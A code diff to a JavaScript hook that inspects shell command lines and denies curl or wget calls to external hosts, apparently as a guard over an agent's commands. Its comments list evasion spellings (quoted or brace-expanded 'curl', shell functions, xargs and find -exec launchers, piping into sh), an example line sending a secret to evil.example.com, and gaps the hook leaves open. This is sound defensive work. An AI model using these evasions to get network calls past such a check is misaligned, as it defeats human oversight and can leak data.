@@ -27,6 +27,15 @@
 //      a command that runs either verb (#1931 review);
 //   6. a command line given to a shell as a string (`bash -c '...'`, `sh -lc "..."`, `eval '...'`)
 //      gets the whole analysis, like a heredoc fed to a shell (4.).
+//   7. (#1931 delta review 5529333917) a SHELL FUNCTION defined in the command: each call is judged
+//      as the function body with the call's arguments in $1..$9 (like `sh -c`); a function that would
+//      deny and is named anywhere but a plain call (eval, trap, export -f) denies;
+//   8. curl / wget STARTED BY ANOTHER PROGRAM from its arguments or its input (xargs, parallel,
+//      find -exec, watch, su -c, flock, cp of the binary ...): any curl / wget word among the
+//      arguments of a command outside NAMES_ONLY denies, fail closed, and a shell reading its program
+//      from a pipe denies;
+//   9. a command word bash EXPANDS (`$X`, brace expansion, a glob): if it can be curl or wget, it
+//      denies.
 // The command word is found past assignments, shell keywords and the PREFIX_WORDS commands with
 // their own options (timeout, stdbuf, nice, nohup, env, sudo, command, exec, time), on every path.
 // FALSE-POSITIVE POLICY. A body that uses a network primitive is denied for ANY external URL in it,
@@ -71,8 +80,6 @@
 //   - network calls INSIDE a script file: the hook sees only the outer command line;
 //   - a program that reaches an interpreter through a PIPE or a file rather than through a heredoc /
 //     here-string attached to the interpreter itself;
-//   - a destination that a DIFFERENT command reads from stdin and turns into arguments (argument
-//     builders such as xargs or parallel: `xargs curl` has no URL in its argv);
 //   - for an INTERPRETER one-liner (not curl / wget): values bound by builtins other than `for` and a
 //     plain `read`, loop input from a file or a pipe, and a URL not literally in the command. For
 //     curl and wget all of these DENY since #1931 round 3: a destination host still holding a `$`
@@ -89,6 +96,8 @@
 //     body scan finds destinations by URL scheme only;
 //   - an interpreter body that reaches the network without a recognised primitive name (a subprocess
 //     running a downloader, a browser driver, encoded or obfuscated code such as -EncodedCommand);
+//   - a copy or link of the curl / wget binary made by an EARLIER call: this command never names it
+//     (making the copy in the same command denies, 8.);
 //   - every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig ...).
 // Closing those is direction (b): an allowlist / network-level gate, not this hook.
 //
@@ -246,7 +255,7 @@ function pythonUsesNetwork(text) {
 // because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
 // them a curl inside a loop or an if/then body was never looked at.
 export const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice',
-  'timeout', 'stdbuf', 'do', 'then', 'else', 'elif', '{', '(', '!'])
+  'timeout', 'stdbuf', 'do', 'then', 'else', 'elif', '{', '(', '!', 'if', 'while', 'until', 'setsid', 'busybox', 'toybox'])
 // A prefix COMMAND (not a keyword) may carry its own options before the real command word:
 // `timeout -k 5 30 cmd`, `stdbuf -oL cmd`, `nice -n 5 cmd`, `env -u X A=1 cmd`, `sudo -u u cmd`.
 // Every word starting with `-` is skipped; the options listed here also consume the next word.
@@ -261,13 +270,18 @@ const PREFIX_OPT_VALUE = {
   timeout: new Set(['-s', '--signal', '-k', '--kill-after']),
   stdbuf: new Set(['-o', '--output', '-e', '--error', '-i', '--input']),
 }
-const PREFIX_COMMANDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf'])
+const PREFIX_COMMANDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf', 'setsid'])
 const PREFIX_POSITIONALS = { timeout: 1 }
 // Index of the real command word in `mw` (a sub-command's words): assignments, prefix words and
 // the prefix commands' own options and arguments are skipped.
 export function commandIndex(mw) {
   let i = 0
   while (i < mw.length) {
+    // `a=( x y )`: a compound array assignment runs nothing, up to the word that closes it.
+    if (/^[A-Za-z_][A-Za-z0-9_]*\+?=\(/.test(mw[i]) && !/\)$/.test(mw[i])) {
+      while (i < mw.length && !/\)$/.test(mw[i])) i++
+      i++; continue
+    }
     if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i])) { i++; continue }
     const p = mw[i].split('/').pop()
     if (!PREFIX_WORDS.has(p)) break
@@ -405,7 +419,7 @@ function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
 export function liftSubstitutions(text) {
   // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
   // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
-  const inners = []; const herestrings = []; const bodies = []; let out = ''; let i = 0
+  const inners = []; const innerAts = []; const herestrings = []; const bodies = []; let out = ''; let i = 0
   // A live substitution at `at` is lifted (inner kept); returns the next index or -1.
   // Its place is filled with `$` (length-preserving), not blanked (#1931, round 3): the value is
   // computed at run time, so wherever it lands -- a curl / wget destination, a variable that later
@@ -418,11 +432,11 @@ export function liftSubstitutions(text) {
   const lift = (at, procSubst = false) => {
     if ((text[at] === '$' || (procSubst && (text[at] === '<' || text[at] === '>'))) && text[at + 1] === '(') {
       const j = substEnd(text, at)
-      inners.push(text.slice(at + 2, j - 1)); out += '$'.repeat(j - at); return j
+      inners.push(text.slice(at + 2, j - 1)); innerAts.push(at); out += '$'.repeat(j - at); return j
     }
     if (text[at] === '`') {
       const j = backtickEnd(text, at)
-      inners.push(text.slice(at + 1, j - 1).replace(/\\([$`\\])/g, '$1')); out += '$'.repeat(j - at); return j
+      inners.push(text.slice(at + 1, j - 1).replace(/\\([$`\\])/g, '$1')); innerAts.push(at); out += '$'.repeat(j - at); return j
     }
     return -1
   }
@@ -457,7 +471,7 @@ export function liftSubstitutions(text) {
       // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
       // by processing it recursively, then continue with the body
       const lineRest = liftSubstitutions(text.slice(i, nl + 1))
-      out += lineRest.stripped; inners.push(...lineRest.inners)
+      out += lineRest.stripped; inners.push(...lineRest.inners); innerAts.push(...lineRest.innerAts.map((p) => p + i))
       herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
       const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
       const rel = endRx.exec(text.slice(i))
@@ -494,7 +508,7 @@ export function liftSubstitutions(text) {
     if (n !== -1) { i = n; continue }
     out += c; i++
   }
-  return { stripped: out, inners, herestrings, bodies }
+  return { stripped: out, inners, innerAts, herestrings, bodies }
 }
 // curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
 // curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
@@ -976,14 +990,180 @@ function insideQuote(text, at) {
   }
   return q !== null
 }
-export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set()) {
+// #1931 delta review (5529333917), class 1: a SHELL FUNCTION. `f() { curl "$1"; }; f URL` runs curl
+// with the URL the CALL passes, so the definition is not a command line of its own: every definition
+// is cut out of the text (length-preserving), and each call of it is judged as its body with the
+// call's arguments in $1..$9, exactly like `sh -c` (positionalBody: what cannot be substituted
+// faithfully denies). A definition that is never called runs nothing. Found on the MASKED text, so a
+// quoted `f() {` is not one; the body ends at the matching brace / parenthesis, `${...}` skipped.
+const FUNC_DEF = /(?:^|[\s;&|(){}!])(?:function\s+([A-Za-z_][\w.:-]*)\s*(?:\(\s*\))?|([A-Za-z_][\w.:-]*)\s*\(\s*\))\s*([{(])/g
+export function functionDefs(masked) {
+  const defs = []
+  for (const m of masked.matchAll(FUNC_DEF)) {
+    const open = m.index + m[0].length - 1
+    const start = m.index + (/^[\s;&|(){}!]/.test(m[0]) ? 1 : 0)
+    if (defs.some((d) => start < d.end)) continue                  // inside an earlier definition
+    const [o, c] = m[3] === '{' ? ['{', '}'] : ['(', ')']
+    let depth = 0, k = open
+    for (; k < masked.length; k++) {
+      if (o === '{' && masked[k] === '$' && masked[k + 1] === '{') { const e = masked.indexOf('}', k); k = e === -1 ? masked.length : e; continue }
+      if (masked[k] === o) depth++
+      else if (masked[k] === c && --depth === 0) break
+    }
+    defs.push({ name: m[1] ?? m[2], start, bodyStart: open + 1, bodyEnd: Math.min(k, masked.length), end: Math.min(k + 1, masked.length) })
+  }
+  return defs
+}
+function blankRanges(text, ranges) {
+  let out = text
+  for (const [s, e] of ranges) out = out.slice(0, s) + out.slice(s, e).replace(/[^\n]/g, ' ') + out.slice(e)
+  return out
+}
+// Class 3: a command word that bash EXPANDS before it runs it. Brace expansion (`{cu,}rl`,
+// `{curl,URL}`), a pathname glob (`/usr/bin/cur?`, `[c]url`) or a parameter it cannot resolve
+// (`${X:-cu}rl`) can each yield curl or wget, while the literal-word check sees neither. Such a word
+// is expanded here as far as it can be: a brace / glob reading that CAN be curl or wget denies, and a
+// `$` left after this command's own assignments denies (computed at run time, nothing to prove).
+const FETCHERS = ['curl', 'wget']
+const MAX_BRACE_WORDS = 64
+export function braceExpand(word) {
+  const out = []
+  const walk = (w) => {
+    if (out.length > MAX_BRACE_WORDS) return
+    for (let i = 0; i < w.length; i++) {
+      if (w[i] !== '{' || w[i - 1] === '$') continue
+      let depth = 0, j = i; const commas = []
+      for (; j < w.length; j++) {
+        if (w[j] === '{') depth++
+        else if (w[j] === '}' && --depth === 0) break
+        else if (w[j] === ',' && depth === 1) commas.push(j)
+      }
+      if (j >= w.length) return void out.push(w)
+      const head = w.slice(0, i), tail = w.slice(j + 1), inner = w.slice(i + 1, j)
+      const range = /^(-?\d+|[A-Za-z])\.\.(-?\d+|[A-Za-z])$/.exec(inner)
+      if (commas.length) {
+        let from = i + 1
+        for (const c of [...commas, j]) { walk(head + w.slice(from, c) + tail); from = c + 1 }
+        return
+      }
+      if (range) {
+        const num = /\d/.test(range[1])
+        const a = num ? Number(range[1]) : range[1].charCodeAt(0), b = num ? Number(range[2]) : range[2].charCodeAt(0)
+        for (let x = a; a <= b ? x <= b : x >= b; x += a <= b ? 1 : -1) {
+          walk(head + (num ? String(x) : String.fromCharCode(x)) + tail)
+          if (out.length > MAX_BRACE_WORDS) return
+        }
+        return
+      }
+    }
+    out.push(w)
+  }
+  walk(word)
+  return out.length > MAX_BRACE_WORDS ? null : out
+}
+function globRegex(glob) {
+  let re = ''
+  for (let i = 0; i < glob.length; i++) {
+    const c = glob[i]
+    if (c === '*') re += '.*'
+    else if (c === '?') re += '.'
+    else if (c === '[') {
+      const e = glob.indexOf(']', i + 2)
+      if (e === -1) { re += '\\['; continue }
+      const cls = glob.slice(i + 1, e).replace(/^[!^]/, '^').replace(/[\\\][]/g, '\\$&')
+      try { new RegExp(`[${cls}]`) } catch { re += '\\['; continue }
+      re += `[${cls}]`; i = e
+    } else re += c.replace(/[.*+?^${}()|[\]\\/]/g, '\\$&')
+  }
+  return new RegExp(`^${re}$`)
+}
+// Can this (unquoted, already expanded) word, as a program name, be curl or wget?
+export function mayBeFetcher(word) {
+  // Only the program NAME matters: `$S/run.sh` runs run.sh wherever $S points. A `/` inside ${...}
+  // (`${X/a/curl}`) is a substitution, not a directory, so such a word stays unknown.
+  if (/\$\{[^}]*\//.test(word)) return true
+  if (word.split('/').pop().includes('$')) return true
+  const all = braceExpand(word)
+  if (all === null) return true
+  return all.some((w) => {
+    const base = w.split('/').pop()
+    if (FETCHERS.includes(base)) return true
+    return /[*?[]/.test(base) && FETCHERS.some((f) => globRegex(base).test(f))
+  })
+}
+// Class 2: a program that STARTS another program from its own arguments or its input -- argument
+// builders (xargs, parallel), find -exec / -ok, watch, flock, ionice, su -c, script -c ... A curl or
+// wget word in its argv is a launch whose URL comes from the input or from a placeholder the parser
+// cannot prove, so it denies, fail closed. The rule is generic: ANY command with a curl / wget word
+// among its arguments denies, except the commands below, which only NAME a program (search for it,
+// print it, install it, ask about it) and never run it. A command line given to such a launcher as
+// one string (`watch 'curl ...'`, `su -c '...'`, `xargs sh -c '...'`) is judged too: a shell word in
+// the argv is read as a `sh -c` call, and for STRING_LAUNCHERS any argument that is itself a command
+// line naming curl / wget denies.
+const NAMES_ONLY = new Set(['echo', 'printf', 'grep', 'egrep', 'fgrep', 'rg', 'ag', 'ack', 'which', 'type',
+  'whereis', 'whatis', 'apropos', 'man', 'info', 'help', 'hash', 'apt', 'apt-get', 'apt-cache', 'dpkg',
+  'dpkg-query', 'snap', 'brew', 'rpm', 'dnf', 'yum', 'pacman', 'pgrep', 'pkill', 'killall', 'pidof',
+  'ls', 'stat', 'file', 'readlink', 'realpath', 'ldd', 'strings', 'sha256sum', 'sha1sum', 'md5sum', 'wc',
+  'test', '[', '[[', 'gh'])
+const STRING_LAUNCHERS = new Set(['xargs', 'parallel', 'find', 'watch', 'su', 'runuser', 'script', 'flock',
+  'tmux', 'screen', 'systemd-run', 'xvfb-run', 'unbuffer', 'ionice', 'chrt', 'taskset', 'doas', 'sg',
+  'firejail', 'strace', 'ltrace', 'nsenter', 'unshare', 'chroot', 'entr', 'at', 'batch'])
+const FIND_EXEC = new Set(['-exec', '-execdir', '-ok', '-okdir'])
+export function launchedFetch(cmd, args) {
+  if (NAMES_ONLY.has(cmd)) return null
+  if (cmd === 'find') {
+    // find runs only what follows -exec / -ok, up to `;` or `+`: that is a command line of its own.
+    for (let k = 0; k < args.length; k++) {
+      if (!FIND_EXEC.has(args[k])) continue
+      let e = k + 1
+      while (e < args.length && args[e] !== ';' && args[e] !== '+') e++
+      const sub = args.slice(k + 1, e)
+      if (sub.length) {
+        const w = sub[0]
+        if (FETCHERS.includes(w.split('/').pop()) || (/[$*?[{]/.test(w) && mayBeFetcher(w))) return w
+        const hit = launchedFetch(w.split('/').pop(), sub.slice(1))
+        if (hit !== null) return hit
+      }
+      k = e
+    }
+    return null
+  }
+  const launcher = STRING_LAUNCHERS.has(cmd)
+  for (const w of args) {
+    if (/^-/.test(w)) continue
+    if (FETCHERS.includes(w.split('/').pop())) return w
+    // A brace / glob word that can expand to curl or wget, where it is the program a launcher starts.
+    if (launcher && !/[\s$]/.test(w) && /[{}*?[]/.test(w) && mayBeFetcher(w)) return w
+    if (launcher && /\s/.test(w) && /\b(?:curl|wget)\b/.test(w)) return w.slice(0, 60)
+  }
+  return null
+}
+// Function bodies are judged per call, and a body calling other functions fans out: identical
+// readings are judged once per top-level command, and past FUNCTION_BUDGET judgements the command
+// denies (measured: 30 functions calling each other took 12 s before the memo).
+const FUNCTION_BUDGET = 500
+let fnMemo = null
+function judgeBody(text, depth, vendorHosts, vendorDomains, tainted) {
+  const key = `${depth}|${tainted ? 1 : 0}|${text}`
+  if (fnMemo.has(key)) return fnMemo.get(key)
+  if (fnMemo.size >= FUNCTION_BUDGET) return { deny: true, reason: 'function-budget', hosts: ['<too many function calls to read>'] }
+  const r = classify(text, depth, vendorHosts, vendorDomains, tainted)
+  fnMemo.set(key, r)
+  return r
+}
+// stdinTainted: this text is a function body whose call may receive curl / wget on stdin (the calling
+// command names either), so a shell in it that reads stdin denies (see 'shell-stdin').
+export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), stdinTainted = false) {
+  if (depth === 0) fnMemo = new Map()
   const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
-  const { stripped: orig, inners, herestrings, bodies } = liftSubstitutions(norm)
+  const lifted = liftSubstitutions(norm)
+  const { inners, innerAts, herestrings, bodies } = lifted
+  let orig = lifted.stripped
   // #1931 delta review: what is too deeply nested to read is DENIED, not passed unread.
   if (inners.length && depth >= MAX_DEPTH) return NESTING_LIMIT
   // Also with quotes and backslashes taken out: `cu''rl` and `c\url` run curl.
   const fetches = /\b(?:curl|wget)\b/.test(norm) || /\b(?:curl|wget)\b/.test(norm.replace(/['"\\]/g, ''))
-  const masked = maskInertLiterals(orig)
+  let masked = maskInertLiterals(orig)
   if (masked === null || masked.length !== orig.length) {
     for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
     // Since curl https:// and wget can leave the deny list, this hook is their only gate: a command
@@ -991,6 +1171,20 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     // the fail-open (#1931 delta review).
     return fetches ? { deny: true, reason: 'unparseable', hosts: ['<unparseable command>'] } : { deny: false, reason: 'unparseable', hosts: [] }
   }
+  // Shell functions (class 1): cut out of the text, judged per call (see functionDefs). defsText is
+  // handed to every body judged on behalf of this command (a call, a substitution), so a function
+  // calling another one, or one called inside $(...), is still resolved.
+  const defs = functionDefs(masked)
+  const funcs = new Map()
+  for (const d of defs) funcs.set(d.name, [...(funcs.get(d.name) ?? []), norm.slice(d.bodyStart, d.bodyEnd)])
+  const defsText = defs.map((d) => norm.slice(d.start, d.end)).join('\n')
+  const withDefs = (t) => (defs.length ? `${defsText}\n${t}` : t)
+  if (defs.length) {
+    const ranges = defs.map((d) => [d.start, d.end])
+    orig = blankRanges(orig, ranges); masked = blankRanges(masked, ranges)
+  }
+  const inDef = (at) => defs.some((d) => at >= d.start && at < d.end)
+  const calls = new Map()                                         // function name -> spans calling it
   if (fetches) {
     const redirect = envRedirect(masked) ?? envIndirect(orig, masked)
     if (redirect) return { deny: true, reason: 'env-redirect', hosts: [redirect] }
@@ -1011,12 +1205,18 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
   // "$(curl $u)"; done` binds u inside the substitution too. So each inner is judged once per loop
   // reading, with the assignments expanded; read alone it would hold an unresolved $u (#1931, round 3:
   // measured on the fleet's own commands, a private-IP loop of exactly this shape).
-  for (const inner of inners) {
+  for (const [n, inner] of inners.entries()) {
+    if (inDef(innerAts[n])) continue                              // judged with the call's arguments
+    // $(( ... )) is arithmetic, not a command: only the substitutions inside it run.
+    if (/^\(.*\)$/s.test(inner)) {
+      for (const t of liftSubstitutions(inner.slice(1, -1)).inners) { const r = classify(withDefs(expand(t, env)), depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
+      continue
+    }
     const plainInner = expand(inner, env)
     const vs = loopVariants(inner, env, loops)
     if (vs === null && /\b(?:curl|wget)\b/.test(inner)) return { deny: true, reason: 'loop-unbounded', hosts: [] }
     const readings = vs !== null && vs.some((v) => v !== plainInner) ? vs : [plainInner]
-    for (const t of readings) { const r = classify(t, depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
+    for (const t of readings) { const r = classify(withDefs(t), depth + 1, vendorHosts, vendorDomains); if (r.deny) return r }
   }
   // A heredoc / here-string that IS the program of an interpreter is judged like a -c / -e body: the
   // same NET_PRIMITIVE test, the same URL_RE scan, the same local / private / vendor exceptions. A
@@ -1025,7 +1225,8 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     const cmd = commandWordAt(orig, masked, f.at, env)
     // A command word computed at run time ($S, $(...)) may be a shell OR an interpreter: its body is
     // judged as both.
-    const computed = cmd !== null && cmd.includes('$')
+    // So is a word bash expands (brace, glob) and a function call: the body may run a shell on stdin.
+    const computed = cmd !== null && (/[$*?[{]/.test(cmd) || funcs.has(cmd))
     const shell = cmd !== null && (SHELL.test(cmd) || computed)
     if (!shell && !(cmd !== null && INTERPRETER.test(cmd.toLowerCase()))) continue
     const plain = f.expands ? expand(f.text, env) : f.text
@@ -1052,7 +1253,8 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
     if (bodies.some(([s0, e0]) => a >= s0 && a < e0)) continue
     const mw = words(masked.slice(a, b))
     const i = commandIndex(mw)
-    if (i >= mw.length) continue
+    // `env -S 'cmd'` has no command word of its own: its value is the command line.
+    if (i >= mw.length && !mw.some((w) => w.split('/').pop() === 'env')) continue
     // Every loop reading AND the plain one: a loop variable can share its name with an assignment
     // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
     // loop-only reading would let the assigned value go unjudged.
@@ -1063,18 +1265,76 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       // from the masked words it was blind to `"curl"`, `cu''rl`, `c\url` and `C=curl; $C` (#1931,
       // round 3, measured: all ten such spellings passed).
       const uw = shellWords(text)
-      const cmd = (uw[commandIndex(uw)] ?? mw[i]).split('/').pop()
-      // A command word computed at run time ($CMD, $(...)) is a program this hook cannot name: it
-      // denies when the command mentions curl / wget or points at an external URL.
-      if (cmd.includes('$') && !insideQuote(orig, a) && (fetches || [...text.matchAll(URL_RE)].some((m) => isExternal(m[0])))) {
-        return { deny: true, reason: 'unresolved-command', hosts: [`<command computed at run time: ${cmd.slice(0, 40)}>`] }
+      const ci = commandIndex(uw)
+      const word = uw[ci] ?? mw[i] ?? ''
+      const cmd = word.split('/').pop()
+      const args = uw.slice(ci + 1)
+      // A loop variable in the command word is judged in its loop readings, not in the plain one.
+      const loopOnly = text === plain && variants !== null && variants.some((v) => v !== plain)
+      if (funcs.has(word)) {
+        // Class 1: a call of a function defined in this command runs its body with these arguments.
+        calls.set(word, (calls.get(word) ?? new Set()).add(a))
+        if (loopOnly) continue
+        for (const fbody of funcs.get(word)) {
+          // A recursive function runs into the nesting limit by itself: only a command that names
+          // curl or wget is denied for it.
+          if (depth >= MAX_DEPTH - 1 && !fetches) continue
+          if (depth >= MAX_DEPTH) return NESTING_LIMIT
+          const body = positionalBody(fbody, [word, ...args])
+          if (body === null) return { deny: true, reason: 'function-positional', hosts: [`<curl/wget argument of ${word}() from $1..$9, $@ or $*>`] }
+          const r = judgeBody(withDefs(body), depth + 1, vendorHosts, vendorDomains, fetches || stdinTainted)
+          if (r.deny) return { ...r, reason: `function-${r.reason}` }
+        }
+        continue
+      }
+      // Class 3: a command word bash expands (a `$` this command does not assign, a brace expansion,
+      // a glob) is a program this hook cannot name. If the expansion CAN be curl or wget, it denies;
+      // a `$` always can (#1931 delta review 5529333917: fail closed, nothing proves the URL).
+      if (!insideQuote(orig, a) && !loopOnly && !/^\d*[<>]/.test(word) && /[$*?[{]/.test(word) && mayBeFetcher(word)) {
+        return { deny: true, reason: 'expanded-command', hosts: [`<command word expanded at run time: ${word.slice(0, 40)}>`] }
+      }
+      // `env -S 'cmd args'` splits its value into the command line it runs.
+      const envAt = uw.slice(0, ci).findIndex((w) => w.split('/').pop() === 'env')
+      if (envAt !== -1) {
+        for (let k = envAt + 1; k < ci; k++) {
+          const m = /^(?:-S|--split-string)(?:=(.*))?$|^-S(.+)$/s.exec(uw[k])
+          if (!m) continue
+          const line = m[1] ?? m[2] ?? uw[k + 1] ?? ''
+          if (depth >= MAX_DEPTH) return NESTING_LIMIT
+          const r = classify(withDefs(`${line} ${args.join(' ')}`), depth + 1, vendorHosts, vendorDomains)
+          if (r.deny) return { ...r, reason: `env-S-${r.reason}` }
+        }
+      }
+      // Class 2: a curl / wget launched by another program from its arguments or its input.
+      if (cmd !== 'curl' && cmd !== 'wget' && !insideQuote(orig, a)) {
+        const launched = launchedFetch(cmd, args)
+        if (launched !== null) return { deny: true, reason: 'launched', hosts: [`<${cmd} starts ${launched}>`] }
+        // A shell word among the arguments (`xargs sh -c '...'`, `ionice -c3 bash -c '...'`) is a
+        // `sh -c` call of its own, read the same way as one in command position.
+        const sh = NAMES_ONLY.has(cmd) || SHELL.test(cmd) ? undefined : args.find((w) => SHELL.test(w.split('/').pop()))
+        const inner = sh === undefined ? null : shellCommandCall(sh.split('/').pop(), args.join(' ') === '' ? '' : text.slice(text.indexOf(sh)))
+        if (inner !== null) {
+          if (depth >= MAX_DEPTH) return NESTING_LIMIT
+          const body = positionalBody(inner.body, inner.args)
+          if (body === null) return { deny: true, reason: 'launched-shell-positional', hosts: [`<${cmd} starts ${sh} -c with curl/wget arguments>`] }
+          const r = classify(withDefs(body), depth + 1, vendorHosts, vendorDomains)
+          if (r.deny) return { ...r, reason: `launched-shell-${r.reason}` }
+        }
+        // A shell that reads its program from stdin (no -c string, no script file) runs whatever the
+        // pipe or redirection hands it: `echo 'curl URL' | sh`. A heredoc / here-string feed is judged
+        // above; any other input cannot be read here, so with curl or wget in sight it denies.
+        if (SHELL.test(cmd) && shellCommandCall(cmd, text) === null && !args.some((w) => !w.startsWith('-') && !w.startsWith('+'))
+          && !feeds.some((f) => f.at >= a && f.at <= b) && (fetches || stdinTainted || /(?:^|[^|])\|\s*$/.test(masked.slice(0, a)))) {
+          return { deny: true, reason: 'shell-stdin', hosts: [`<${cmd} reads its commands from stdin>`] }
+        }
       }
       const call = shellCommandCall(cmd, text)
       if (call !== null) {
         if (depth >= MAX_DEPTH) return NESTING_LIMIT
         const body = positionalBody(call.body, call.args)
         if (body === null) return { deny: true, reason: 'shell-c-positional', hosts: ['<curl/wget argument from $1..$9, $@ or $*>'] }
-        const r = classify(body, depth + 1, vendorHosts, vendorDomains)
+        // eval runs in this shell, so it sees this command's functions; `sh -c` does not.
+        const r = classify(cmd === 'eval' ? withDefs(body) : body, depth + 1, vendorHosts, vendorDomains)
         if (r.deny) return { ...r, reason: `shell-c-${r.reason}` }
       }
       let target = null
@@ -1101,6 +1361,20 @@ export function classify(command, depth = 0, vendorHosts = new Set(), vendorDoma
       if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
       if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
     }
+  }
+  // Class 1, fail closed: a function whose body would deny with unknown arguments may be started in a
+  // way the calls above do not show (`export -f f; bash -c 'f URL'`, `eval "f URL"`, `trap f EXIT`).
+  // Its name anywhere outside a judged call denies.
+  // A comment (`# f <args>`) names the function without calling it.
+  const uncommented = orig.replace(/(?:^|(?<=[\s;&|]))#[^\n]*/g, (m, at) => (/#/.test(masked[at] ?? '') ? ' '.repeat(m.length) : m))
+  for (const [name, fbodies] of funcs) {
+    const re = new RegExp(`(?<![\\w.:-])${name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}(?![\\w.:-])`, 'g')
+    const seen = (uncommented.match(re) ?? []).length
+    if (seen <= (calls.get(name)?.size ?? 0)) continue
+    // A recursive function reaches the nesting limit on its own; that alone does not make it a fetch.
+    const denies = (fb) => { const r = judgeBody(withDefs(fb), depth + 1, vendorHosts, vendorDomains, false); return r.deny && r.hosts[0] !== NESTING_LIMIT.hosts[0] }
+    const risky = fetches || (depth < MAX_DEPTH && fbodies.some(denies))
+    if (risky) return { deny: true, reason: 'function-indirect', hosts: [`<${name}() started outside a plain call>`] }
   }
   return { deny: false, reason: null, hosts: [] }
 }
